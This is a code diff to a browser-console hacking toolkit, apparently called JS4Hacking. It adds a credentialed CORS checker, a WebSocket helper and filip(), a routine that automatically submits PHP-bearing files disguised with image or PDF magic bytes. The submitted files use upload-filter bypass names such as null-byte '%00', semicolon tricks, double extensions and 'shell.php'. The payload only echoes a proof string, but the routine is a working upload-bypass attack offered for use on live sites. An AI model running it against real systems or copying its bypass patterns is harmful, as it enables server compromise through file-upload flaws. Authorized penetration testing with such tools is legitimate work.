@@ -70,7 +70,7 @@ function collectFormInputs(formElement) {
 
 function brute() {
     return "";
-}async function corscheck() {
+}async function corscheck(num=0) {
     const input = prompt("Enter domains (newline separated):");
     if (!input) return;
   
@@ -81,7 +81,7 @@ function brute() {
       const url = `https://${domain}/`;
   
       try {
-        const res = await fetch(url, { mode: 'cors' });
+        const res = num==0 ? await fetch(url, { mode: 'cors' }) : await fetch(url, { mode: 'cors', credentials:'include' }) ;
         console.log(`✅ Fetched: ${url}`);
         successful.push(domain);
       } catch (e) {
@@ -146,6 +146,87 @@ function easyLoopLimiter2(loopStrtNum, loopEndNum, timeToPause, yourFunction) {
         }
     }, timeToPause)
 
+}
+function filip(fileInput = null, formElement = null) {
+    fileInput = fileInput || document.querySelector('input[type="file"]');
+    formElement = formElement || document.querySelector('form');
+
+    if (!fileInput || !(fileInput instanceof HTMLInputElement)) {
+        console.warn("File input element not found.");
+        return;
+    }
+
+    if (!formElement || !(formElement instanceof HTMLFormElement)) {
+        console.warn("Form element not found.");
+        return;
+    }
+
+    const payload = '<?php echo "I am POC"; ?>';
+
+    const baseFiles = [
+        { ext: 'png', mime: 'image/png', header: [0x89, 0x50, 0x4E, 0x47] },
+        { ext: 'jpg', mime: 'image/jpeg', header: [0xFF, 0xD8, 0xFF] },
+        { ext: 'gif', mime: 'image/gif', header: [0x47, 0x49, 0x46, 0x38] },
+        { ext: 'pdf', mime: 'application/pdf', header: [0x25, 0x50, 0x44, 0x46] }
+    ];
+
+    const testFiles = [];
+
+    // Base and trick combos
+    for (const f of baseFiles) {
+        testFiles.push(
+            { name: `${f.ext}.php`, mime: f.mime, header: f.header },
+            { name: `test.${f.ext}%00.php`, mime: f.mime, header: f.header },
+            { name: `test.php%00.${f.ext}`, mime: f.mime, header: f.header },
+            { name: `test.php;.${f.ext}`, mime: f.mime, header: f.header },
+            { name: `test.${f.ext};.php`, mime: f.mime, header: f.header }
+        );
+    }
+
+    // Pure PHP disguised as image
+    testFiles.push({
+        name: 'shell.php',
+        mime: 'application/x-php',
+        header: [0x3C, 0x3F, 0x70, 0x68] // "<?ph"
+    });
+
+    const generateBlob = (headerBytes, phpCode, mimeType) => {
+        const header = new Uint8Array(headerBytes);
+        const code = new TextEncoder().encode(phpCode);
+        const full = new Uint8Array(header.length + code.length);
+        full.set(header, 0);
+        full.set(code, header.length);
+        return new Blob([full], { type: mimeType });
+    };
+
+    const runTests = async () => {
+        for (let file of testFiles) {
+            const blob = generateBlob(file.header, payload, file.mime);
+            const testFile = new File([blob], file.name, { type: file.mime });
+
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(testFile);
+            fileInput.files = dataTransfer.files;
+
+            console.log(`[*] Testing: ${file.name} (type: ${file.mime})`);
+            fileInput.dispatchEvent(new Event('change', { bubbles: true }));
+
+            formElement.dispatchEvent(new Event('submit', { bubbles: true }));
+            if (formElement.submit) {
+                try {
+                    formElement.submit();
+                } catch (e) {
+                    console.warn("Form.submit() failed. Maybe it's AJAX based.");
+                }
+            }
+
+            await new Promise(res => setTimeout(res, 2000));
+        }
+
+        alert("✅ filip() test run complete! Check network panel.");
+    };
+
+    runTests();
 }
 function showhtml() {
 // dumb function but I love it, make sure you are in data:, or in safe domain just in case
@@ -297,6 +378,72 @@ function unhideinp() {
 document.querySelectorAll('input[type="hidden"]').forEach(input => {
     input.type = 'text';
 });
+}
+let socks = {
+  socket: null,
+  isConnected: false,
+
+  connect: function () {
+    const url = prompt("Enter WSS URL (ex: wss://echo.websocket.org):");
+    if (!url) return alert("No WSS URL provided!");
+
+    this.socket = new WebSocket(url);
+
+    this.socket.onopen = () => {
+      this.isConnected = true;
+      console.log(`[SOCKS] Connected to ${url}`);
+      this.listen();
+    };
+
+    this.socket.onmessage = (e) => {
+      console.log(`[SOCKS] ⬅ Received:`, e.data);
+    };
+
+    this.socket.onclose = () => {
+      this.isConnected = false;
+      console.log(`[SOCKS] Disconnected from ${url}`);
+    };
+
+    this.socket.onerror = (e) => {
+      console.error(`[SOCKS] ❌ Error:`, e);
+    };
+  },
+
+  listen: function () {
+    console.log('[SOCKS] Type `socks.send()` to send data or `socksexit()` to disconnect');
+
+    this.send = () => {
+      if (!this.isConnected) return console.warn("[SOCKS] Not connected!");
+      const msg = prompt("Enter message to send:");
+      if (!msg) return;
+      try {
+        const parsed = JSON.parse(msg);
+        this.socket.send(JSON.stringify(parsed));
+        console.log("[SOCKS] ➡ Sent JSON:", parsed);
+      } catch (e) {
+        this.socket.send(msg);
+        console.log("[SOCKS] ➡ Sent text:", msg);
+      }
+    };
+  },
+
+  disconnect: function () {
+    if (this.socket) {
+      this.socket.close();
+      this.isConnected = false;
+      console.log("[SOCKS] Manual disconnect.");
+    }
+  }
+};
+
+// Exit alias
+function socksexit() {
+  socks.disconnect();
+}
+
+// Connect alias
+function socksconnect() {
+  socks.connect();
 }
 
 console.log("%c[JS4Hacking] Main.js injected 🚀", "color: cyan");
